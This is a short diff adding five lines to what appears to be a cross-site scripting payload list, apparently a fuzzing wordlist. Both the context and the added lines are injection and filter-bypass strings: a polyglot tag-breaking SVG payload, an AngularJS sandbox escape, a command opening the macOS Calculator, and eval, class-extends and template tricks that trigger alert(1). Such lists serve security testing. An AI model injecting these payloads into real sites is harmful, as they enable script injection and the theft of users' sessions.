@@ -212,3 +212,8 @@ eval(String.raw({raw:'aet(1)'},'l','r'))
 process.open("/Applications/Calculator.app/Contents/MacOS/Calculator");
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+//+/onmouseover=1/+/[*/[]/+alert(1)//'>
 {{'a'.constructor.prototype.charAt=[].join;$eval('x=1}}};alert(1)//');}}
+eval("1+1?>");eval("1+1</script>");eval("1+1//?>");
+new class extends class extends class extends class extends alert(1){}{}{}{}
+setInterval`alert\x28document.domain\x29`
+x=new class extends Function{}('alert(1)');x=new x;
+eval(Symbol(')-alert(1').toString())
